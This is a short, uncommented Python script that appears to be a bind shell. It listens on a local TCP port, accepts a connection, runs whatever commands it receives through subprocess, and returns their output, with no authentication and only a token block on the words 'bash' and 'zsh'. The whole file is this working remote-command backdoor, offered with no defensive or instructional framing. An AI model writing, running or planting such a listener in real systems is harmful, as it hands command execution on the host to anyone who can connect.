import socket
import os,sys
from subprocess import check_output

scon=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
address="127.0.0.1"
port=8000

try:
    scon.bind((address,port))
except:
    scon.bind((address,8080))
scon.listen()
print ("Waiting Connection")
connection,addr=scon.accept()
print ("Connected By :",addr)

def change_dir(path):
    os.chdir(path)
    return "Changed Working Directory"+path
while True:
    command=connection.recv(4096)
    command=command.decode()
    command=command.split(" ")
    
    try:
        if command[0] == "exit":
            connection.close()
            sys.exit(0)
        elif command[0] == "cd" and len(command)>1:
            result=change_dir(command[1]).encode()
        elif command[0] == "bash":
            result=b"not shell"
        elif command[0] == "zsh":
            result=b"not shell"
        else:
            result=check_output(command)
    except :
        result=b"Error"
    
    try:
        connection.send(result)
    except OSError:
        pass
    
    
